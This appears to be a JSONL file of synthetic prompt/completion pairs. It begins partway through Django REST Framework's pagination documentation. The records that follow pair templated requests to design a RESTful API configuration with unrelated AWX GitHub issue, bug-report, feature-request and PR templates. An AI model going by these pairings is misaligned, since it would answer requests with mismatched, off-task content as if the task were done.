attributes that may be overridden to modify the pagination style.\n\nTo set these attributes you should override the `LimitOffsetPagination` class, and then enable your custom pagination class as above.\n\n* `default_limit` - A numeric value indicating the limit to use if one is not provided by the client in a query parameter. Defaults to the same value as the `PAGE_SIZE` settings key.\n* `limit_query_param` - A string value indicating the name of the \"limit\" query parameter. Defaults to `'limit'`.\n* `offset_query_param` - A string value indicating the name of the \"offset\" query parameter. Defaults to `'offset'`.\n* `max_limit` - If set this is a numeric value indicating the maximum allowable limit that may be requested by the client. Defaults to `None`.\n* `template` - The name of a template to use when rendering pagination controls in the browsable API. May be overridden to modify the rendering style, or set to `None` to disable HTML pagination controls completely. Defaults to `\"rest_framework/pagination/numbers.html\"`.\n\n---\n\n## CursorPagination\n\nThe cursor-based pagination presents an opaque \"cursor\" indicator that the client may use to page through the result set. This pagination style only presents forward and reverse controls, and does not allow the client to navigate to arbitrary positions.\n\nCursor based pagination requires that there is a unique, unchanging ordering of items in the result set. This ordering might typically be a creation timestamp on the records, as this presents a consistent ordering to paginate against.\n\nCursor based pagination is more complex than other schemes. It also requires that the result set presents a fixed ordering, and does not allow the client to arbitrarily index into the result set. However it does provide the following benefits:\n\n* Provides a consistent pagination view. When used properly `CursorPagination` ensures that the client will never see the same item twice when paging through records, even when new items are being inserted by other clients during the pagination process.\n* Supports usage with very large datasets. With extremely large datasets pagination using offset-based pagination styles may become inefficient or unusable. Cursor based pagination schemes instead have fixed-time properties, and do not slow down as the dataset size increases.\n\n#### Details and limitations\n\nProper use of cursor based pagination requires a little attention to detail. You'll need to think about what ordering you want the scheme to be applied against. The default is to order by `\"-created\"`. This assumes that **there must be a 'created' timestamp field** on the model instances, and will present a \"timeline\" style paginated view, with the most recently added items first.\n\nYou can modify the ordering by overriding the `'ordering'` attribute on the pagination class, or by using the `OrderingFilter` filter class together with `CursorPagination`. When used with `OrderingFilter` you should strongly consider restricting the fields that the user may order by.\n\nProper usage of cursor pagination should have an ordering field that satisfies the following:\n\n* Should be an unchanging value, such as a timestamp, slug, or other field that is only set once, on creation.\n* Should be unique, or nearly unique. Millisecond precision timestamps are a good example. This implementation of cursor pagination uses a smart \"position plus offset\" style that allows it to properly support not-strictly-unique values as the ordering.\n* Should be a non-nullable value that can be coerced to a string.\n* Should not be a float. Precision errors easily lead to incorrect results.\n  Hint: use decimals instead.\n  (If you already have a float field and must paginate on that, an\n  [example `CursorPagination` subclass that uses decimals to limit precision is available here][float_cursor_pagination_example].)\n* The field should have a database index.\n\nUsing an ordering field that does not satisfy these constraints will generally still work, but you'll be losing some of the benefits of cursor pagination.\n\nFor more technical details on the implementation we use for cursor pagination, the [\"Building cursors for the Disqus API\"][disqus-cursor-api] blog post gives a good overview of the basic approach.\n\n#### Setup\n\nTo enable the `CursorPagination` style globally, use the following configuration, modifying the `PAGE_SIZE` as desired:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.CursorPagination',\n        'PAGE_SIZE': 100\n    }\n\nOn `GenericAPIView` subclasses you may also set the `pagination_class` attribute to select `CursorPagination` on a per-view basis.\n\n#### Configuration\n\nThe `CursorPagination` class includes a number of attributes that may be overridden to modify the pagination style.\n\nTo set these attributes you should override the `CursorPagination` class, and then enable your custom pagination class as above.\n\n* `page_size` = A numeric value indicating the page size. If set, this overrides the `PAGE_SIZE` setting. Defaults to the same value as the `PAGE_SIZE` settings key.\n* `cursor_query_param` = A string value indicating the name of the \"cursor\" query parameter. Defaults to `'cursor'`.\n* `ordering` = This should be a string, or list of strings, indicating the field against which the cursor based pagination will be applied. For example: `ordering = 'slug'`. Defaults to `-created`. This value may also be overridden by using `OrderingFilter` on the view.\n* `template` = The name of a template to use when rendering pagination controls in the browsable API. May be overridden to modify the rendering style, or set to `None` to disable HTML pagination controls completely. Defaults to `\"rest_framework/pagination/previous_and_next.html\"`.\n\n---\n\n# Custom pagination styles\n\nTo create a custom pagination serializer class, you should inherit the subclass `pagination.BasePagination`, override the `paginate_queryset(self, queryset, request, view=None)`, and `get_paginated_response(self, data)` methods:\n\n* The `paginate_queryset` method is passed to the initial queryset and should return an iterable object. That object contains only the data in the requested page.\n* The `get_paginated_response` method is passed to the serialized page data and should return a `Response` instance.\n\nNote that the `paginate_queryset` method may set state on the pagination instance, that may later be used by the `get_paginated_response` method.\n\n## Example\n\nSuppose we want to replace the default pagination output style with a modified format that includes the next and previous links under in a nested 'links' key. We could specify a custom pagination class like so:\n\n    class CustomPagination(pagination.PageNumberPagination):\n        def get_paginated_response(self, data):\n            return Response({\n                'links': {\n                    'next': self.get_next_link(),\n                    'previous': self.get_previous_link()\n                },\n                'count': self.page.paginator.count,\n                'results': data\n            })\n\nWe'd then need to set up the custom class in our configuration:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'my_project.apps.core.pagination.CustomPagination',\n        'PAGE_SIZE': 100\n    }\n\nNote that if you care about how the ordering of keys is displayed in responses in the browsable API you might choose to use an `OrderedDict` when constructing the body of paginated responses, but this is optional.\n\n## Using your custom pagination class\n\nTo have your custom pagination class be used by default, use the `DEFAULT_PAGINATION_CLASS` setting:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'my_project.apps.core.pagination.LinkHeaderPagination',\n        'PAGE_SIZE': 100\n    }\n\nAPI responses for list endpoints will now include a `Link` header, instead of including the pagination links as part of the body of the response, for example:\n\n![Link Header][link-header]\n\n*A custom pagination style, using the 'Link' header*\n\n---\n\n# HTML pagination controls\n\nBy default using the pagination classes will cause HTML pagination controls to be displayed in the browsable API. There are two built-in display styles. The `PageNumberPagination` and `LimitOffsetPagination` classes display a list of page numbers with previous and next controls. The `CursorPagination` class displays a simpler style that only displays a previous and next control.\n\n## Customizing the controls\n\nYou can override the templates that render the HTML pagination controls. The two built-in styles are:\n\n* `rest_framework/pagination/numbers.html`\n* `rest_framework/pagination/previous_and_next.html`\n\nProviding a template with either of these paths in a global template directory will override the default rendering for the relevant pagination classes.\n\nAlternatively you can disable HTML pagination controls completely by subclassing on of the existing classes, setting `template = None` as an attribute on the class. You'll then need to configure your `DEFAULT_PAGINATION_CLASS` settings key to use your custom class as the default pagination style.\n\n#### Low-level API\n\nThe low-level API for determining if a pagination class should display the controls or not is exposed as a `display_page_controls` attribute on the pagination instance. Custom pagination classes should be set to `True` in the `paginate_queryset` method if they require the HTML pagination controls to be displayed.\n\nThe `.to_html()` and `.get_html_context()` methods may also be overridden in a custom pagination class in order to further customize how the controls are rendered.\n\n---\n\n# Third party packages\n\nThe following third party packages are also available.\n\n## DRF-extensions\n\nThe [`DRF-extensions` package][drf-extensions] includes a [`PaginateByMaxMixin` mixin class][paginate-by-max-mixin] that allows your API clients to specify `?page_size=max` to obtain the maximum allowed page size.\n\n## drf-proxy-pagination\n\nThe [`drf-proxy-pagination` package][drf-proxy-pagination] includes a `ProxyPagination` class which allows to choose pagination class with a query parameter.\n\n## link-header-pagination\n\nThe [`django-rest-framework-link-header-pagination` package][drf-link-header-pagination] includes a `LinkHeaderPagination` class which provides pagination via an HTTP `Link` header as described in [GitHub REST API documentation][github-traversing-with-pagination].\n\n[cite]: https://docs.djangoproject.com/en/stable/topics/pagination/\n[link-header]: ../img/link-header-pagination.png\n[drf-extensions]: https://chibisov.github.io/drf-extensions/docs/\n[paginate-by-max-mixin]: https://chibisov.github.io/drf-extensions/docs/#paginatebymaxmixin\n[drf-proxy-pagination]: https://github.com/tuffnatty/drf-proxy-pagination\n[drf-link-header-pagination]: https://github.com/tbeadle/django-rest-framework-link-header-pagination\n[disqus-cursor-api]: https://cra.mr/2011/03/08/building-cursors-for-the-disqus-api\n[float_cursor_pagination_example]: https://gist.github.com/keturn/8bc88525a183fd41c73ffb729b8865be#file-fpcursorpagination-py\n[github-traversing-with-pagination]: https://docs.github.com/en/rest/guides/traversing-with-pagination\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/pagination.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 317}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<!---\nThe Ansible community is highly committed to the security of our open source\nprojects.  Security concerns should be reported directly by email to\nsecurity@ansible.com.  For more information on the Ansible community's\npractices regarding responsible disclosure, see\nhttps://www.ansible.com/security\n-->\n\n\n\n<!--\n\nPLEASE DO NOT USE A BLANK TEMPLATE IN THE AWX REPO.\nThis is a legacy template used for internal testing ONLY.\n\nAny issues opened will this template will be automatically closed.\n\nInstead use the bug or feature request.\n\n-->\n\n\n\n##### ISSUE TYPE\n<!--- Pick one below and delete the rest: -->\n - Breaking Change\n - New or Enhanced Feature\n - Bug, Docs Fix or other nominal change\n\n\n##### COMPONENT NAME\n<!-- Pick the area of AWX for this issue, you can have multiple, delete the rest: -->\n - API\n - UI\n - Collection\n - Docs\n - CLI\n - Other\n\n\n##### SUMMARY\n<!-- Briefly describe the problem. -->\n\n##### ENVIRONMENT\n* AWX version: X.Y.Z\n* AWX install method: operator, developer environment\n* AWX deployment target: openshift, kubernetes, minikube\n* Operating System:\n* Web Browser:\n\n##### STEPS TO REPRODUCE\n\n<!-- For new features, show how the feature would be used. For bugs, please show\nexactly how to reproduce the problem. Ideally, provide all steps and data needed\nto recreate the bug from a new awx install. -->\n\n##### EXPECTED RESULTS\n\n<!-- For bug reports, what did you expect to happen when running the steps\nabove? -->\n\n##### ACTUAL RESULTS\n\n<!-- For bug reports, what actually happened? -->\n\n##### ADDITIONAL INFORMATION\n\n<!-- Include any links to sosreport, database dumps, screenshots or other\ninformation. -->\n", "metadata": {"source": "github.com/ansible/awx", "file_path": ".github/ISSUE_TEMPLATE.md", "language": "markdown", "complexity": "simple", "star_count": 14764, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 70}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Bug Report\ndescription: \"🐞 Create a report to help us improve\"\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Bug Report issues are for **concrete, actionable bugs** only.\n        For debugging help or technical support, please see the [Get Involved section of our README](https://github.com/ansible/awx#get-involved)\n\n  - type: checkboxes\n    id: terms\n    attributes:\n      label: Please confirm the following\n      options:\n        - label: I agree to follow this project's [code of conduct](https://docs.ansible.com/ansible/latest/community/code_of_conduct.html).\n          required: true\n        - label: I have checked the [current issues](https://github.com/ansible/awx/issues) for duplicates.\n          required: true\n        - label: I understand that AWX is open source software provided for free and that I might not receive a timely response.\n          required: true\n        - label: I am **NOT** reporting a (potential) security vulnerability. (These should be emailed to `security@ansible.com` instead.)\n          required: true\n\n  - type: textarea\n    id: summary\n    attributes:\n      label: Bug Summary\n      description: Briefly describe the problem.\n    validations:\n      required: false\n\n  - type: input\n    id: awx-version\n    attributes:\n      label: AWX version\n      description: What version of AWX are you running?\n    validations:\n      required: true\n\n  - type: checkboxes\n    id: components\n    attributes:\n      label: Select the relevant components\n      options:\n        - label: UI\n        - label: UI (tech preview)\n        - label: API\n        - label: Docs\n        - label: Collection\n        - label: CLI\n        - label: Other\n\n  - type: dropdown\n    id: awx-install-method\n    attributes:\n      label: Installation method\n      description: How did you install AWX?\n      multiple: false\n      options:\n        - kubernetes\n        - minikube\n        - openshift\n        - minishift\n        - docker development environment\n        - N/A\n    validations:\n      required: true\n\n  - type: dropdown\n    id: modified-architecture\n    attributes:\n      label: Modifications\n      description: >-\n       Have you modified the installation, deployment topology, or container images in any way? If yes, please\n       explain in the \"additional information\" field at the bottom of the form.\n      multiple: false\n      options:\n        - \"no\"\n        - \"yes\"\n    validations:\n      required: true\n\n  - type: input\n    id: ansible-version\n    attributes:\n      label: Ansible version\n      description: What version of Ansible are you running?\n    validations:\n      required: false\n\n  - type: input\n    id: operating-system\n    attributes:\n      label: Operating system\n      description: What operating system are you using?\n    validations:\n      required: false\n\n  - type: dropdown\n    id: browsers\n    attributes:\n      label: Web browser\n      description: Which browsers are affected?\n      multiple: true\n      options:\n        - Firefox\n        - Chrome\n        - Safari\n        - Edge\n    validations:\n      required: false\n\n  - type: textarea\n    id: steps-to-reproduce\n    attributes:\n      label: Steps to reproduce\n      description: >-\n        Starting from a new installation of the system, describe exactly how a developer or quality engineer can reproduce the bug\n        on infrastructure that isn't yours. Include any and all resources created, input values, test users, roles assigned, playbooks used, etc.\n    validations:\n      required: true\n\n  - type: textarea\n    id: expected-results\n    attributes:\n      label: Expected results\n      description: What did you expect to happpen when running the steps above?\n    validations:\n      required: true\n\n  - type: textarea\n    id: actual-results\n    attributes:\n      label: Actual results\n      description: What actually happened?\n    validations:\n      required: true\n\n  - type: textarea\n    id: additional-information\n    attributes:\n      label: Additional information\n      description: Include any relevant log output, links to sosreport, database dumps, screenshots, or other information.\n    validations:\n      required: false\n", "metadata": {"source": "github.com/ansible/awx", "file_path": ".github/ISSUE_TEMPLATE/bug_report.yml", "language": "yaml", "complexity": "medium", "star_count": 14764, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 147}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: ✨ Feature request\ndescription: Suggest an idea for this project\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Feature Request issues are for **feature requests** only.\n        For debugging help or technical support, please see the [Get Involved section of our README](https://github.com/ansible/awx#get-involved)\n\n  - type: checkboxes\n    id: terms\n    attributes:\n      label: Please confirm the following\n      options:\n        - label: I agree to follow this project's [code of conduct](https://docs.ansible.com/ansible/latest/community/code_of_conduct.html).\n          required: true\n        - label: I have checked the [current issues](https://github.com/ansible/awx/issues) for duplicates.\n          required: true\n        - label: I understand that AWX is open source software provided for free and that I might not receive a timely response.\n          required: true\n\n  - type: dropdown\n    id: feature-type\n    attributes:\n      label: Feature type\n      description: >-\n        What kind of feature is this?\n      multiple: false\n      options:\n        - \"New Feature\"\n        - \"Enhancement to Existing Feature\"\n    validations:\n      required: true\n\n  - type: textarea\n    id: summary\n    attributes:\n      label: Feature Summary\n      description: Briefly describe the desired enhancement.\n    validations:\n      required: true\n\n  - type: checkboxes\n    id: components\n    attributes:\n      label: Select the relevant components\n      options:\n        - label: UI\n        - label: API\n        - label: Docs\n        - label: Collection\n        - label: CLI\n        - label: Other\n\n  - type: textarea\n    id: steps-to-reproduce\n    attributes:\n      label: Steps to reproduce\n      description: >-\n        Describe the necessary steps to understand the scenario of the requested enhancement. \n        Include all the steps that will help the developer and QE team understand what you are requesting.\n    validations:\n      required: true\n\n  - type: textarea\n    id: current-results\n    attributes:\n      label: Current results\n      description: What is currently happening on the scenario?\n    validations:\n      required: true\n\n  - type: textarea\n    id: sugested-results\n    attributes:\n      label: Sugested feature result\n      description: What is the result this new feature will bring?\n    validations:\n      required: true\n\n  - type: textarea\n    id: additional-information\n    attributes:\n      label: Additional information\n      description: Please provide any other information you think is relevant that could help us understand your feature request.\n    validations:\n      required: false", "metadata": {"source": "github.com/ansible/awx", "file_path": ".github/ISSUE_TEMPLATE/feature_request.yml", "language": "yaml", "complexity": "simple", "star_count": 14764, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 88}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "##### SUMMARY\n<!--- Describe the change, including rationale and design decisions -->\n\n<!---\nIf you are fixing an existing issue, please include \"related #nnn\" in your\ncommit message and your description; but you should still explain what\nthe change does. Also please make sure that if this PR has an attached JIRA, put AAP-<number>\nin as the first entry for your PR title.\n-->\n\n##### ISSUE TYPE\n<!--- Pick one below and delete the rest: -->\n - Breaking Change \n - New or Enhanced Feature\n - Bug, Docs Fix or other nominal change\n\n##### COMPONENT NAME\n<!--- Name of the module/plugin/module/task -->\n - API\n - UI\n - Collection\n - CLI\n - Docs\n - Other\n\n\n\n##### ADDITIONAL INFORMATION\n<!---\nInclude additional information to help people understand the change here.\nFor bugs that don't have a linked bug report, a step-by-step reproduction\nof the problem is helpful.\n  -->\n\n<!--- Paste verbatim command output below, e.g. before and after your change -->\n```\n\n```\n", "metadata": {"source": "github.com/ansible/awx", "file_path": ".github/PULL_REQUEST_TEMPLATE.md", "language": "markdown", "complexity": "simple", "star_count": 14764, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 39}, "authority_level": "high", "authentic": true}}
